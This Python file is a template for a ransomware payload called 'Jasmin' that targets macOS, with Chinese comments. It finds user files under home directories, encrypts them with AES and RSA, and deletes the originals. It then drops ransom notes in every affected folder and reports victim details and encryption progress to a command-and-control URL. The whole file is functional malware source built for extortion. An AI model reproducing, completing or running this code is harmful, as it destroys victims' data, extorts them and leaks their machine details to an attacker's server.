#!/usr/bin/env python3
# Jasmin macOS Payload — Auto-generated
# 内存安全版：不联网安装依赖(避免编译被OOM杀)，大文件流式加密，带加密进度条
import os,sys,subprocess,struct,hashlib,socket,platform,datetime,json,time
try:import urllib.request,urllib.parse
except:pass

C2='{{C2_URL}}'
SECRET='{{HANDSHAKE}}'
RSA_PUB=b"""{{RSA_PUBLIC_KEY}}"""

# 仅当 cryptography 已安装时使用；绝不 pip install（编译 cryptography 需数百MB内存，会触发OOM Killer）
USE_LIB=False
try:
    from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
    from cryptography.hazmat.primitives.asymmetric import padding as ap
    from cryptography.hazmat.primitives import hashes,serialization
    from cryptography.hazmat.backends import default_backend
    USE_LIB=True
except Exception:
    USE_LIB=False

def _has_openssl():
    try:return subprocess.run(['openssl','version'],capture_output=True).returncode==0
    except:return False

HAS_OPENSSL=_has_openssl()
if not USE_LIB and not HAS_OPENSSL:
    sys.stderr.write('[!] 无cryptography库且无openssl命令，无法运行\n');sys.exit(1)

import tempfile as _tf

SKIP_DIRS=frozenset(['/System','/Library','/usr','/bin','/sbin','/private/var/db','/dev','/Volumes'])
EXTS={'.pptx','.docx','.xlsx','.txt','.pdf','.csv','.jpg','.jpeg','.png','.zip','.rar','.7z','.mp3','.mp4','.sql','.bak','.html','.php','.py','.java','.json','.xml','.yaml','.md','.conf'}
NOTE_NAME='READ_ME_DECRYPT.txt'
CHUNK=1024*1024  # 1MB 分块，内存占用恒定
SELF=os.path.basename(__file__)

def skip(p):
    fp=os.path.abspath(p)
    n=os.path.basename(fp)
    if n==SELF:return True
    if fp.endswith('.jasmin') or n.startswith('READ_ME_'):return True
    for d in SKIP_DIRS:
        if fp.startswith(d+'/'):return True
    if '/.ssh/' in fp:return True
    _,e=os.path.splitext(fp)
    return e.lower() not in EXTS

def _sha256_stream(path):
    """分块计算SHA256，不把整个文件读进内存"""
    h=hashlib.sha256()
    with open(path,'rb') as f:
        while True:
            b=f.read(CHUNK)
            if not b:break
            h.update(b)
    return h.digest()

def _enc_lib(path,pub):
    """cryptography 流式 AES-256-CBC，内存恒定"""
    k,iv=os.urandom(32),os.urandom(16)
    c=Cipher(algorithms.AES(k),modes.CBC(iv),default_backend()).encryptor()
    tmp=path+'.jasmin'
    h=hashlib.sha256()
    leftover=b''
    try:
        with open(path,'rb') as fin,open(tmp,'wb') as fout:
            fout.write(b'\x00'*32)  # 占位，最后回填摘要
            while True:
                buf=fin.read(CHUNK)
                if not buf:break
                h.update(buf)
                leftover+=buf
                n=len(leftover)-(len(leftover)%16)
                if n:
                    fout.write(c.update(leftover[:n]));leftover=leftover[n:]
            padn=16-len(leftover)
            leftover+=bytes([padn])*padn
            fout.write(c.update(leftover)+c.finalize())
            ek=pub.encrypt(k+iv,ap.OAEP(mgf=ap.MGF1(hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
            fout.write(ek);fout.write(struct.pack('<I',len(ek)))
        with open(tmp,'r+b') as f:
            f.seek(0);f.write(h.digest())
        os.remove(path);return True
    except Exception:
        try:os.remove(tmp)
        except:pass
        return False

def _enc_openssl(path,pub_pem_path):
    """openssl 走文件流，内存恒定；PKCS7 由 openssl 自动完成（不再手动预填充，避免双重padding）"""
    tmp=path+'.jasmin'
    k=os.urandom(32);iv=os.urandom(16)
    h=_sha256_stream(path)
    td=_tf.mkdtemp()
    try:
        kf=os.path.join(td,'k');cf=os.path.join(td,'c');ef=os.path.join(td,'e')
        r=subprocess.run(['openssl','enc','-aes-256-cbc','-nosalt','-in',path,'-out',cf,'-K',k.hex(),'-iv',iv.hex()],capture_output=True)
        if r.returncode!=0:return False
        open(kf,'wb').write(k+iv)
        r=subprocess.run(['openssl','pkeyutl','-encrypt','-pubin','-inkey',pub_pem_path,'-in',kf,'-out',ef,'-pkeyopt','rsa_padding_mode:oaep','-pkeyopt','rsa_oaep_md:sha256','-pkeyopt','rsa_mgf1_md:sha256'],capture_output=True)
        if r.returncode!=0:return False
        ek_len=os.path.getsize(ef)
        with open(tmp,'wb') as f:
            f.write(h)
            with open(cf,'rb') as src:
                while True:
                    b=src.read(CHUNK)
                    if not b:break
                    f.write(b)
            with open(ef,'rb') as esrc:
                f.write(esrc.read())
            f.write(struct.pack('<I',ek_len))
        os.remove(path);return True
    except Exception:
        try:os.remove(tmp)
        except:pass
        return False
    finally:
        try:import shutil;shutil.rmtree(td)
        except:pass

def encrypt(path,pub_obj,pub_pem_path):
    if skip(path):return False
    try:
        if USE_LIB:return _enc_lib(path,pub_obj)
        else:return _enc_openssl(path,pub_pem_path)
    except:return False

RANSOM_TXT="""
{{RANSOM_NOTE}}
"""

def get_sid():
    try:return hex(os.getuid())+'-'+socket.gethostname()
    except:return 'unknown'

def drop_notes(dirs,sid):
    txt=RANSOM_TXT.replace('{sid}',sid)
    # 必须显式 utf-8：受害者机器 locale 可能是 C/POSIX，
    # 默认编码写中文会抛 UnicodeEncodeError 并被 except 静默吞掉 -> 勒索信不生成
    written=0
    for d in dirs:
        if not os.path.isdir(d):continue
        try:
            with open(os.path.join(d,NOTE_NAME),'w',encoding='utf-8',errors='replace') as f:f.write(txt)
            written+=1
        except Exception:pass
        for desk in ['Desktop','桌面']:
            dp=os.path.join(d,desk)
            if os.path.isdir(dp):
                try:
                    with open(os.path.join(dp,NOTE_NAME),'w',encoding='utf-8',errors='replace') as f:f.write(txt)
                    written+=1
                except Exception:pass
    sys.stderr.write('[jasmin] 勒索信已投放 %d 处\n'%written)

# ────────────────────────────────────────
# 进度条
# ────────────────────────────────────────
def _fmt_b(n):
    try:n=float(n)
    except:return '0B'
    for u in ('B','KB','MB','GB','TB'):
        if n<1024:return ('%.0f%s'%(n,u)) if u=='B' else ('%.2f%s'%(n,u))
        n/=1024
    return '%.2fPB'%n

def scan_targets(roots):
    """预扫描：只统计数量与字节数，不保存路径列表，内存 O(1)"""
    n=0;total=0
    for r in roots:
        if not os.path.isdir(r):continue
        for dp,_,fs in os.walk(r):
            for f in fs:
                fp=os.path.join(dp,f)
                if skip(fp):continue
                try:sz=os.path.getsize(fp)
                except:continue
                n+=1;total+=sz
    return n,total

def make_progress(total_files,total_bytes,sid):
    """返回 (tick, state, finish)。tick(path,size,ok) 每处理一个文件调用一次。
    周期性回传进度到C2，供Web后台实时进度条使用。"""
    st={'done':0,'bytes':0,'ok':0,'fail':0}
    tty=sys.stderr.isatty()
    last=[time.time()]

    def tick(path,size,ok):
        st['done']+=1;st['bytes']+=size
        if ok:st['ok']+=1
        else:st['fail']+=1
        if total_bytes>0:pct=st['bytes']*100.0/total_bytes
        elif total_files>0:pct=st['done']*100.0/total_files
        else:pct=100.0
        if pct>100.0:pct=100.0
        if tty:
            try:cols=os.get_terminal_size().columns
            except:cols=100
            barw=28
            fill=int(pct*barw/100.0)
            bar='█'*fill+'░'*(barw-fill)
            cur=path
            if len(cur)>34:cur='…'+cur[-33:]
            line='  [%s] %5.1f%%  %d/%d  %s/%s  %s'%(bar,pct,st['done'],total_files,_fmt_b(st['bytes']),_fmt_b(total_bytes),cur)
            if len(line)>cols-1:line=line[:cols-1]
            sys.stderr.write('\r'+line)
        else:
            if st['done']%50==0 or st['done']==total_files:
                sys.stderr.write('[jasmin] %5.1f%% (%d/%d) %s/%s\n'%(pct,st['done'],total_files,_fmt_b(st['bytes']),_fmt_b(total_bytes)))
        try:sys.stderr.flush()
        except:pass
        now=time.time()
        if now-last[0]>=8:  # 每8秒回传一次进度
            last[0]=now
            beacon(sid,None,{'ok':st['ok'],'bytes':st['bytes'],'total':total_files,'total_bytes':total_bytes})

    def finish():
        if tty:
            sys.stderr.write('\n')
            try:sys.stderr.flush()
            except:pass
    return tick,st,finish

def beacon(sid,stats=None,prog=None):
    try:
        d={'handshake':SECRET,'machine_name':socket.gethostname(),'computer_user':os.getenv('USER','?'),
           'os':f'{platform.system()} {platform.release()}','date':datetime.datetime.now().strftime('%d/%m/%Y, %A'),
           'time':datetime.datetime.now().strftime('%H:%M:%S'),'ip':'0.0.0.0','location':'?',
           'systemid':sid,'password':'RSA_PROTECTED'}
        try:d['ip']=urllib.request.urlopen('https://api.ipify.org',timeout=5).read().decode()
        except:pass
        if prog:
            # 进行中：回传实时进度
            d['encrypted_count']=str(prog['ok'])
            d['encrypted_size']=str(prog['bytes'])
            d['total_count']=str(prog['total'])
            d['total_size']=str(prog['total_bytes'])
            d['is_complete']='0'
        if stats:
            # 完成：回传最终统计
            d['encrypted_count']=str(stats['count'])
            d['encrypted_size']=str(stats['size'])
            d['encrypted_types']=','.join(sorted(stats['types']))
            d['encrypted_detail']=json.dumps(stats.get('detail',{}))
            d['total_count']=str(stats.get('total_count',stats['count']))
            d['total_size']=str(stats.get('total_size',stats['size']))
            d['is_complete']='1'
        req=urllib.request.Request(C2,data=urllib.parse.urlencode(d).encode(),method='POST')
        urllib.request.urlopen(req,timeout=10)
    except Exception as e:
        # 不再静默：否则回连失败时后台永远没有数据，用户完全无从判断
        sys.stderr.write('[jasmin] !!! 上报失败: %s\n'%C2)
        sys.stderr.write('[jasmin] !!! 原因: %s\n'%e)
        sys.stderr.write('[jasmin] !!! 请检查回连地址是否可达、端口是否正确(本服务在 :8080)、握手密钥是否与后台一致\n')

def main():
    pub_obj=None;pub_pem_path=None
    if USE_LIB:
        pub_obj=serialization.load_pem_public_key(RSA_PUB,default_backend())
    else:
        td=_tf.mkdtemp();pub_pem_path=os.path.join(td,'pub.pem')
        open(pub_pem_path,'wb').write(RSA_PUB)
    sid=get_sid()
    roots=[os.path.expanduser('~'),'/Users','/tmp']

    # ── 阶段1: 预扫描（统计总数，用于进度条分母） ──
    sys.stderr.write('[jasmin] 正在扫描目标文件...\n')
    n_total,b_total=scan_targets(roots)
    sys.stderr.write('[jasmin] 发现 %d 个目标文件，合计 %s\n'%(n_total,_fmt_b(b_total)))

    stats={'count':0,'size':0,'types':set(),'detail':{},'total_count':n_total,'total_size':b_total}
    hit_dirs=set()   # 记录含有被加密文件的目录 —— 勒索信必须投放到每一个

    if n_total>0:
        # ── 阶段2: 加密（带实时进度条） ──
        tick,pst,finish=make_progress(n_total,b_total,sid)
        for r in roots:
            if not os.path.isdir(r):continue
            for dp,_,fs in os.walk(r):
                for f in fs:
                    fp=os.path.join(dp,f)
                    if skip(fp):continue
                    try:sz=os.path.getsize(fp)
                    except:sz=0
                    ok=encrypt(fp,pub_obj,pub_pem_path)
                    tick(fp,sz,ok)
                    if ok:
                        stats['count']+=1;stats['size']+=sz
                        hit_dirs.add(dp)
                        _,e=os.path.splitext(f)
                        if e:
                            e=e.lower();stats['types'].add(e)
                            if e not in stats['detail']:stats['detail'][e]={'count':0,'size':0}
                            stats['detail'][e]['count']+=1;stats['detail'][e]['size']+=sz
        finish()
        sys.stderr.write('[jasmin] 加密完成: %d/%d 个文件, %s / %s\n'%(stats['count'],n_total,_fmt_b(stats['size']),_fmt_b(b_total)))

    note_dirs=set(roots);note_dirs.add(os.path.expanduser('~'))
    note_dirs|=hit_dirs      # 关键：被加密文件所在的每个目录都要有勒索信
    drop_notes(sorted(note_dirs),sid)
    beacon(sid,stats)

if __name__=='__main__':main()
